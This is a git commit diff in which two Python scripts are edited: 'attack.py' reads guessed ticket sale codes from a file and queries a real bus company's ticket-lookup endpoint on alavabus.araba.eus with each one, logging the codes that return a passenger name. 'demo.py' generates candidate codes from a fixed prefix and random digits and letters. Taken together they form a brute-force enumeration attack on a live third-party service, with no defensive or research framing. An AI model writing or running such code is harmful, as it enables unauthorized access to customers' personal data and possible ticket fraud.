63eea345b1a6f6235d11448e1ec2d0dea4d533e0
mquiroga42 <117262918+mquiroga42@users.noreply.github.com>
2023-11-03 12:20:05 +0000

    checkpoint

--- attack.py
+++ attack.py
@@ -4,9 +4,10 @@ url = "https://alavabus.araba.eus/SalesPortalRestService-1/searchTicketConsult"
 
 with open("hex.txt", "r") as archivo:
     for ticket in archivo:
-        response = requests.get(url, params={"saleCode": "B8270E007613BD01", "lang":1})
-        if response.status_code == 200:
-            data = response.text
+        ticket = ticket.replace("\n", "")
+        response = requests.get(url, params={"saleCode": ticket, "lang":1})
+        data = response.json()
+        if data.get("name") is not None:
             print("OK " + ticket, response.status_code)
         else:
             print("Fail " + ticket, response.status_code)
--- demo.py
+++ demo.py
@@ -1,7 +1,7 @@
 import random
 
 def generar_numero_con_letras():
-    numero_aleatorio = [str(random.randint(0, 9)) for _ in range(6)]
+    numero_aleatorio = [str(random.randint(0, 9)) for _ in range(8)]
     
     num_letras = random.randint(1, 2)
     indices = random.sample(range(6), num_letras)
@@ -12,7 +12,7 @@ def generar_numero_con_letras():
     return ''.join(numero_aleatorio) + str(random.randint(0, 9))
 
 with open('hex.txt', 'w') as archivo:
-    for _ in range(10000):
+    for _ in range(1):
         b8270 = 'B8270'
         e0_f0 = random.choice(['E0', 'F0'])
         numletter = generar_numero_con_letras()
